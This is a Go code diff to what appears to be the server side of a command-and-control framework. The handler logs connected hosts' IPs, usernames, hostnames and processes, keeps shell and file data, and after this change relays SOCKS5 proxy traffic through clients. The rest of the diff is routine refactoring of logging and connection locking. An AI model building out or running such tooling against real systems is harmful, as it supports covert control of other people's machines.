@@ -5,6 +5,7 @@ import (
 	"BackendTemplate/pkg/connection"
 	"BackendTemplate/pkg/database"
 	"BackendTemplate/pkg/encrypt"
+	"BackendTemplate/pkg/logger"
 	"BackendTemplate/pkg/qqwry"
 	"BackendTemplate/pkg/utils"
 	"BackendTemplate/pkg/webhooks"
@@ -21,9 +22,13 @@ import (
 	"time"
 )
 
-var TCPClientManger = make(map[string]net.Conn)
+var TCPClientManger = make(map[string]*TCPClient)
 var Mutex sync.Mutex
 
+type TCPClient struct {
+	Conn    net.Conn
+	WriteMu sync.Mutex
+}
 type ClientTime struct {
 	lastHeartbeat time.Time
 	timeoutCount  int
@@ -38,7 +43,7 @@ func HandleTcpConnection(conn net.Conn) {
 		var length uint32
 		err := binary.Read(reader, binary.BigEndian, &length)
 		if err != nil {
-			fmt.Println("Error reading message length:", err)
+			logger.Error("Error reading message length:", err)
 			return
 		}
 
@@ -54,16 +59,19 @@ func HandleTcpConnection(conn net.Conn) {
 			msg := message[4:]
 			tmpMetainfo, err := encrypt.DecodeBase64(msg)
 			if err != nil {
-				fmt.Println(err)
+				logger.Error(err.Error())
 			}
 			metainfo, err := encrypt.Decrypt(tmpMetainfo)
 			if err != nil {
-				fmt.Println(err)
+				logger.Error(err.Error())
 			}
 			uid := encrypt.BytesToMD5(metainfo)
 
 			Mutex.Lock()
-			TCPClientManger[uid] = conn
+			client1 := &TCPClient{
+				Conn: conn,
+			}
+			TCPClientManger[uid] = client1
 			Mutex.Unlock()
 
 			connection.MuClientListenerType.Lock()
@@ -111,7 +119,7 @@ func HandleTcpConnection(conn net.Conn) {
 				if flag > 4 {
 					arch = "x64"
 				}
-				c := database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: "5", Online: "1", Color: ""}
+				c := database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: "0", Online: "1", Color: ""}
 				database.Engine.Insert(&c)
 				database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
 				database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})
@@ -137,11 +145,11 @@ func HandleTcpConnection(conn net.Conn) {
 
 			tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
 			if err != nil {
-				fmt.Println(err)
+				logger.Error(err.Error())
 			}
 			metainfo, err := encrypt.Decrypt(tmpMetainfo)
 			if err != nil {
-				fmt.Println(err)
+				logger.Error(err.Error())
 			}
 			uid := encrypt.BytesToMD5(metainfo)
 
@@ -209,16 +217,20 @@ WHERE uid = ? AND file_path = ?;
 				filePath := string(data[4 : 4+filePathLen])
 				fileContent := data[4+filePathLen:]
 				command.VarFileContentQueue.Add(uid, filePath, string(fileContent))
+			case command.Socks5Data:
+				md5sign := data[:16]
+				rawData := data[16:]
+				command.VarSocks5Queue.Add(uid, fmt.Sprintf("%x", md5sign), string(rawData))
 			}
 		case 3: //heartBeat
 			msg := message[4:]
 			tmpMetainfo, err := encrypt.DecodeBase64(msg)
 			if err != nil {
-				fmt.Println(err)
+				logger.Error(err.Error())
 			}
 			metainfo, err := encrypt.Decrypt(tmpMetainfo)
 			if err != nil {
-				fmt.Println(err)
+				logger.Error(err.Error())
 			}
 			uid := encrypt.BytesToMD5(metainfo)
 
@@ -246,7 +258,7 @@ func checkHeartbeats(uid string) {
 			if currentTime.Sub(ClientTimeManager[uid].lastHeartbeat) > 10*time.Second {
 				ClientTimeManager[uid].timeoutCount++
 				if ClientTimeManager[uid].timeoutCount >= 30 {
-					TCPClientManger[uid].Close()
+					TCPClientManger[uid].Conn.Close()
 					database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "2"})
 					delete(TCPClientManger, uid)
 					delete(ClientTimeManager, uid)
